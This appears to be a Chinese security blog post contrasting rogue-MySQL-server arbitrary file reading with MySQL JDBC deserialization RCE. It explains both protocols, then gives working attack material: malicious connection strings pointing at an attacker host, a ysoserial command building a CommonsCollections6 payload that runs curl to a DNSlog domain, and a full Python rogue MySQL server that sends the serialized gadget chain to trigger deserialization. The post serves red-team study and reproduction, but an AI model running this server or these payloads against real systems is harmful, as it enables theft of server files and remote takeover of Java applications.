#  别再混淆了！MySQL 恶意服务器读文件与 JDBC 反序列化漏洞全解析  
原创 APT-101
                    APT-101  APT-101   2026-06-16 10:10  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNouTfSqoCGzbFay5AEL5aElbRwccOGe5CGG8nCOZR9va5jF7uK9nvvclaVhjQSULWJWMkXFTiaiaiajhemqmXxtUUSj45Ol8Xxicupc/640?wx_fmt=png&from=appmsg "")  
  
[**引言**  
]在日常的黑红对抗遇到一些后台管理系统，有创建数据源功能的点，通常都会涉及两个漏洞：  
- 利用 Rogue MySQL 服务器读取客户端任意文件  
  
- MySQL JDBC 反序列化导致远程代码执行（RCE）  
  
这两个漏洞都能通过控制“数据库连接串（Connection String）”发起攻击，听上去很像，但它们的底层原理、触发技术栈和危害结果完全不同。今天我们就从基本概念、底层协议，到实战演练，彻底把这两个漏洞理清楚！  
## 1. 基本概念对比  
  
这两个漏洞的核心区别可以用一句话概括：**前者是利用了数据库“原生协议的合法特性”来读文件，而后者是利用了特定编程语言驱动的“代码实现缺陷”来执行命令。**  
<table><thead><tr style="box-sizing: border-box;border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><th style="box-sizing: border-box;text-align: left;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;font-weight: bold;background-color: rgb(240, 240, 240);margin: 0px;"><section><span leaf="">维度</span></section></th><th style="box-sizing: border-box;text-align: left;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;font-weight: bold;background-color: rgb(240, 240, 240);margin: 0px;"><section><span leaf="">MySQL 恶意服务器任意文件读取 (Rogue MySQL)</span></section></th><th style="box-sizing: border-box;text-align: left;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;font-weight: bold;background-color: rgb(240, 240, 240);margin: 0px;"><section><span leaf="">Java Database Connectivity (JDBC) 反序列化漏洞</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><strong style="box-sizing: border-box;font-weight: bold;color: rgb(191, 54, 12);"><span leaf="">漏洞本质</span></strong></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><strong style="box-sizing: border-box;font-weight: bold;color: rgb(191, 54, 12);"><span leaf="">设计上的功能特性</span></strong><section><span leaf="">（MySQL 官方定义的标准协议能力）。</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><strong style="box-sizing: border-box;font-weight: bold;color: rgb(191, 54, 12);"><span leaf="">实现上的安全漏洞</span></strong><section><span leaf="">（特定驱动在解析参数时的代码缺陷）。</span></section></td></tr><tr style="box-sizing: border-box;border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><strong style="box-sizing: border-box;font-weight: bold;color: rgb(191, 54, 12);"><span leaf="">攻击目标</span></strong></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section><span leaf="">客户端（如 Python/Go/PHP/Java 程序）所在的</span><strong style="box-sizing: border-box;font-weight: bold;color: rgb(191, 54, 12);"><span leaf="">文件系统</span></strong><span leaf="">。</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section><span leaf="">客户端（必须是 Java 运行环境）的</span><strong style="box-sizing: border-box;font-weight: bold;color: rgb(191, 54, 12);"><span leaf="">内存与 CPU（命令执行）</span></strong><span leaf="">。</span></section></td></tr><tr style="box-sizing: border-box;border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><strong style="box-sizing: border-box;font-weight: bold;color: rgb(191, 54, 12);"><span leaf="">触发前提</span></strong></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section><span leaf="">客户端连接串开启了本地文件上传允许（如 </span><code style="box-sizing: border-box;font-size: 1em;font-family: source-code-pro, Menlo, Monaco, Consolas, &#34;Courier New&#34;, monospace;"><span leaf="">local_infile=1</span></code><span leaf="">）。</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section><span leaf="">1. 客户端使用 Java 语言；</span><span leaf=""><br/></span><span leaf=""><br/></span><span leaf="">2. 连接串包含高危扩展参数；</span><span leaf=""><br/></span><span leaf=""><br/></span><span leaf="">3. 存在可利用的 Gadget 依赖链。</span></section></td></tr><tr style="box-sizing: border-box;border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><strong style="box-sizing: border-box;font-weight: bold;color: rgb(191, 54, 12);"><span leaf="">受影响技术栈</span></strong></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><strong style="box-sizing: border-box;font-weight: bold;color: rgb(191, 54, 12);"><span leaf="">全语言通用</span></strong><section><span leaf="">。不管是 Python (Superset)、Go、PHP 还是 Java，只要驱动支持该协议就会受影响。</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><strong style="box-sizing: border-box;font-weight: bold;color: rgb(191, 54, 12);"><span leaf="">仅限 Java 生态</span></strong><section><span leaf="">。依赖于如 </span><code style="box-sizing: border-box;font-size: 1em;font-family: source-code-pro, Menlo, Monaco, Consolas, &#34;Courier New&#34;, monospace;"><span leaf="">mysql-connector-java</span></code><span leaf=""> 等特定的 Java 依赖库。</span></section></td></tr></tbody></table>## 2. 底层原理深度解密  
### 2.1 MySQL 恶意服务器任意文件读取原理  
  
这个漏洞的根源在于 MySQL 的 LOAD DATA LOCAL INFILE  
 语法。在正常情况下，客户端可以执行这个命令，把自己本地的文件发送并导入到 MySQL 服务端。  
  
为了实现这个功能，MySQL 协议在交互设计上做了一个非常“大胆”的选择：**允许服务端主动向客户端索要文件。**  
  
**交互过程如下：**  
1. **握手与认证：**  
 客户端（如 Superset 的 Python 进程）向攻击者控制的恶意 MySQL 发起连接认证。  
  
1. **请求阶段：**  
 认证通过后，客户端发送一个正常的 SQL 查询请求（例如 Superset 自动发起的 SELECT 1;  
 探测）。  
  
1. **恶意响应：**  
 恶意 MySQL 服务端收到任何请求后，直接无视请求内容，而是向客户端回传一个特制的 **“File Request Packet”（文件请求报文）**  
。这个报文中明确写着：“请把我指定的路径（如 /etc/passwd  
）上传给我”。  
  
1. **客户端响应：**  
 客户端驱动程序收到该报文后，如果配置中 local_infile=1  
，驱动会绕过上层的业务逻辑，直接调用系统 API 读取该文件，并将文件内容打包发送给恶意服务端。  
  
### 2.2 JDBC 反序列化漏洞原理  
  
JDBC 反序列化完全是 Java 生态特有的产物。它的核心在于 Java 的 **驱动管理器在建立连接、初始化某些控制拦截器（Interceptors）时，把服务端返回的配置数据当成了 Java 序列化对象进行解析。**  
  
以最典型的 mysql-connector-java  
 驱动为例，其连接串支持很多复杂的扩展参数，如 autoDeserialize  
、queryInterceptors  
、detectCustomCollations  
 等。  
  
**底层触发链如下（以 detectCustomCollations 为例）：**  
1. **参数激活：**  
 当 Java 程序的 JDBC 连接串中包含 detectCustomCollations=true&autoDeserialize=true  
 时，驱动在连接建立后，会去查询服务端的字符集配置。  
  
1. **反序列化埋点：**  
 驱动源码中在处理服务端返回的某些特定元数据（Metadata）或配置行时，存在一段类似如下的逻辑：  
  
```
// 伪代码：驱动尝试解析服务端返回的二进制数据
if (autoDeserialize && isObject) {
    ObjectInputStream ois = new ObjectInputStream(fieldData);
    ois.readObject(); // 核心触发点：直接触发了反序列化！
}

```  
1. **恶意 Payload 投喂：**  
 恶意服务器在收到字符集查询请求时，将精心构造的 **Java 恶意对象字节流（Gadget Chain，如 CommonsCollections 触发 Runtime.getRuntime().exec()）**  
 作为结果返回。  
  
1. **代码执行：**  
 Java 客户端在不知情的情况下调用了 readObject()  
 驱动解析，从而在本地内存中直接触发了命令执行（RCE）。  
  
## 3. 实践场景演练说明  
  
为了更直观地理解，我们来看在实际安全红蓝对抗或漏洞复现中，这两者的具体表现形态。  
### 3.1 实践场景一：MySQL 恶意服务器任意文件读取  
- **攻击者武器：**  
 一个伪造了 MySQL 协议的 Python 脚本（Rogue Server），监听 3306 端口。  
  
- **受害者入口：**  
 任何语言开发的后台（例如 Python 的 Superset 4.1.2，或者 PHP 的 WordPress），只要后台允许管理员自定义添加 MySQL 数据源。  
  
- **攻击连接串示例（Python/SQLAlchemy）：**  
  
```
#工具参考：https://github.com/rmb122/rogue_mysql_server
mysql+mysqldb://root:pass@attack_ip:3306/db?local_infile=1
```  
- **实践现象：**  
 攻击者点击“测试连接”，受害者前端可能显示“连接失败”或“超时”，但攻击者的 Rogue Server 日志文件中已经躺着受害者服务器的 /etc/passwd  
 或 config.py  
 的明文内容。**（没有执行命令，只有文件泄露）**  
。  
  
### 3.2 实践场景二：JDBC 反序列化漏洞  
- **攻击者武器：**  
 1. 使用 ysoserial  
 生成恶意的 Java 序列化字节流（Payload）；2. 运行一个恶意的 MySQL 伪造服务端（如 Rogue-WebLogic-Mysql  
），将字节流配置在特定的查询响应（如 SHOW COLLATION  
）中。  
  
- **受害者入口：**  
 一个 **Java 开发的系统**  
（如 Spring Boot 网站后台、Apache ShardingSphere、DataGrip 客户端等），且系统内置的类路径（Classpath）中含有脆弱的第三方依赖（如 commons-collections-3.2.1.jar  
）。  
  
- **攻击连接串示例（Java JDBC）：**  
  
```
java -jar ysoserial-all.jar CommonsCollections6 "curl 5b7d302930.ddns.1433.eu.org." > cc6.ser
```  
```
#rogue_mysql_server.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Rogue MySQL Server for JDBC 8.x (Up to 8.0.33) Deserialization Vulnerability Lab
Strictly for authorized security assessment and educational replication.
"""

import socket
import sys
import os

# ==================== 配置区域 ====================
PORT = 3306
PAYLOAD_FILE = "cc6.ser"  # 由 ysoserial 生成的序列化 Payload 文件路径
# ==================================================

def generate_handshake_packet():
    """生成 MySQL 服务端初始握手包 (Protocol Version 10)"""
    packet_body = b''
    packet_body += b'\x0a'  # Protocol version
    packet_body += b'8.0.33-rogue\x00'  # 匹配驱动宣告的版本
    packet_body += b'\x01\x00\x00\x00'  # Connection ID
    packet_body += b'auth_one\x00'  # Auth plugin data part 1 (8 bytes)
    packet_body += b'\xff\xf7'  # Server capabilities
    packet_body += b'\x08'  # Server language (utf8)
    packet_body += b'\x02\x00'  # Server status
    packet_body += b'\xff\x81'  # Extended server capabilities
    packet_body += b'\x00'  # Auth plugin data length
    packet_body += b'\x00' * 10  # Reserved
    packet_body += b'auth_two___\x00'  # Auth plugin data part 2
    packet_body += b'mysql_native_password\x00'  # Auth plugin name

    # 组合头部: 3字节长度 + 1字节序列号(0)
    packet_len = len(packet_body)
    header = bytes([packet_len & 0xff, (packet_len >> 8) & 0xff, (packet_len >> 16) & 0xff, 0x00])
    return header + packet_body

def generate_ok_packet():
    """生成通用的 OK 响应包"""
    packet_body = b'\x00\x00\x00\x02\x00\x00\x00'
    packet_len = len(packet_body)
    header = bytes([packet_len & 0xff, (packet_len >> 8) & 0xff, (packet_len >> 16) & 0xff, 0x01])
    return header + packet_body

def generate_result_set_packet(payload_bytes):
    """
    将 ysoserial 的字节流封装进 MySQL ResultSet 包中。
    当驱动激活 ServerStatusDiffInterceptor 试图解析回包并调用 getObject() 时触发反序列化。
    """
    # 1. Column Count Packet (1列)
    col_count_body = b'\x01'
    col_count_packet = bytes([len(col_count_body), 0, 0, 0]) + col_count_body

    # 2. Column Definition Packet
    col_def_body = b''
    col_def_body += b'\x03def\x00'  # Catalog
    col_def_body += b'\x00'  # Schema
    col_def_body += b'\x05table\x00'  # Table
    col_def_body += b'\x05table\x00'  # Org table
    col_def_body += b'\x04name\x00'  # Name
    col_def_body += b'\x04name\x00'  # Org name
    col_def_body += b'\x0c'  # Next length
    col_def_body += b'\x3f\x00'  # Character set (binary/blob)
    col_def_body += b'\x00\x00\x10\x00'  # Column length
    col_def_body += b'\xfc'  # Type: MYSQL_TYPE_BLOB (核心要素，必须是 BLOB 类型才能引导驱动调用反序列化)
    col_def_body += b'\x90\x00'  # Flags
    col_def_body += b'\x00'  # Decimals
    col_def_body += b'\x00\x00'  # Unused
    col_def_packet = bytes([len(col_def_body), 0, 0, 1]) + col_def_body

    # 3. EOF Packet
    eof_body = b'\xfe\x00\x00\x02\x00'
    eof_packet = bytes([len(eof_body), 0, 0, 2]) + eof_body

    # 4. Row Data Packet (包含实际的序列化 Payload)
    payload_len = len(payload_bytes)
    if payload_len < 251:
        row_body = bytes([payload_len]) + payload_bytes
    elif payload_len < 65536:
        row_body = b'\xfc' + bytes([payload_len & 0xff, (payload_len >> 8) & 0xff]) + payload_bytes
    else:
        row_body = b'\xfd' + bytes([payload_len & 0xff, (payload_len >> 8) & 0xff, (payload_len >> 16) & 0xff]) + payload_bytes

    row_packet = bytes([len(row_body) & 0xff, (len(row_body) >> 8) & 0xff, (len(row_body) >> 16) & 0xff, 3]) + row_body

    # 5. Last EOF Packet
    last_eof_packet = bytes([len(eof_body), 0, 0, 4]) + eof_body

    return col_count_packet + col_def_packet + eof_packet + row_packet + last_eof_packet

def handle_client(client_idx, client_sock):
    print(f"[*] [{client_idx}] 成功接收并激活目标客户端的测试流量。")
    try:
        # 1. 发送初始握手包
        client_sock.sendall(generate_handshake_packet())

        # 2. 接收客户端认证请求
        auth_req = client_sock.recv(1024)
        # 回复 OK 包通过认证阶段
        client_sock.sendall(generate_ok_packet())

        while True:
            data = client_sock.recv(4096)
            if not data:
                break

            packet_len = data[0] | (data[1] << 8) | (data[2] << 16)
            command_type = data[4]

            # 判定是否为 COM_QUERY 交互指令 (0x03)
            if command_type == 0x03:
                query_sql = data[5:5+packet_len-1].decode('utf-8', errors='ignore').strip()
                print(f"[+] [{client_idx}] 捕获到客户端查询 SQL: {query_sql[:80]}...")

                # 状态判定 1：处理 8.x 驱动发起的会话变量初始化大查询
                if "SESSION.AUTO_INCREMENT_INCREMENT" in query_sql.upper():
                    print(f"[*] [{client_idx}] 匹配到初始化系统变量查询，响应常规 OK 包。")
                    client_sock.sendall(generate_ok_packet())

                # 状态判定 2：兼容处理校对集查询
                elif "INFORMATION_SCHEMA.COLLATIONS" in query_sql.upper():
                    print(f"[*] [{client_idx}] 匹配到校对集信息查询，响应常规 OK 包。")
                    client_sock.sendall(generate_ok_packet())

                # 状态判定 3：精准拦截 8.x ServerStatusDiffInterceptor 在执行 query 后发起的两次状态对比查询
                elif "SHOW SESSION STATUS" in query_sql.upper():
                    if os.path.exists(PAYLOAD_FILE):
                        print(f"[🔥] [{client_idx}] 触发核心注入时机：捕获到拦截器执行 SHOW SESSION STATUS")
                        print(f"[*] [{client_idx}] 正在读取本地 '{PAYLOAD_FILE}' 并构建畸形 BLOB 结果集下发...")
                        with open(PAYLOAD_FILE, "rb") as f:
                            payload_bytes = f.read()

                        response = generate_result_set_packet(payload_bytes)
                        client_sock.sendall(response)
                        print(f"[✅] [{client_idx}] 恶意数据包下发完毕，正在强行切入后端驱动反序列化调用栈。")
                        break
                    else:
                        print(f"[🔴] 终断：本地目录下未检测到 '{PAYLOAD_FILE}'，请先生成。")
                        break
                else:
                    # 常规握手设置（如 SET NAMES 等）均默认回复 OK 维持连接
                    client_sock.sendall(generate_ok_packet())
    except Exception as e:
        print(f"[-] [{client_idx}] 攻防状态机交互异常: {e}")
    finally:
        client_sock.close()
        print(f"[*] [{client_idx}] 客户端连接会话已释放销毁。\n")

def main():
    if not os.path.exists(PAYLOAD_FILE):
        print(f"[⚠️] 警告: 当前目录下找不到配置的利用文件 '{PAYLOAD_FILE}'。")
        print(f"请通过指令重新覆盖生成：java -jar ysoserial-all.jar CommonsCollections6 'calc' > {PAYLOAD_FILE}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', PORT))
        server.listen(5)
        print(f"[*] 恶意 MySQL 8.x 专项服务已就绪，正在全网卡监听端口 0.0.0.0:{PORT} ...")
    except Exception as e:
        print(f"[-] 端口绑定失败: {e}")
        sys.exit(1)

    client_count = 0
    try:
        while True:
            client_sock, addr = server.accept()
            client_count += 1
            print(f"\n[*] [{client_count}] 接收到来自目标资产的握手连接 -> {addr[0]}:{addr[1]}")
            handle_client(client_count, client_sock)
    except KeyboardInterrupt:
        print("\n[*] 退出接收，恶意服务端已关闭。")
    finally:
        server.close()

if __name__ == "__main__":
    main()
```  
  
漏洞点插入恶意MySQL地址，触发之后查看DNSlog是否触发，再进一步利用执行命令。  
```
jdbc:mysql://attack_ip:3306/test?detectCustomCollations=true&autoDeserialize=true&serverTimezone=UTC
```  
- **实践现象：**  
 受害者系统一旦尝试建立连接，在调用 DriverManager.getConnection()  
 的瞬间，攻击者的 Payload 在受害者 Java 虚拟机的内存中被反序列化。攻击者可以直接收到一个反弹回来的 **系统 Shell 权限**  
。**（实现了完全的远程代码执行 RCE）**  
。  
  
## 总结  
- 如果主角是 **任意后端语言 + 开启了 local_infile**  
，那么它面临的是 **文件被偷走**  
 的风险（Rogue MySQL）。  
  
- 如果主角是 **Java 语言 + 引入了旧版本 JDBC 驱动与不安全依赖**  
，那么它面临的是 **整个服务器直接被远程接管**  
 的风险（JDBC 反序列化）。  
  
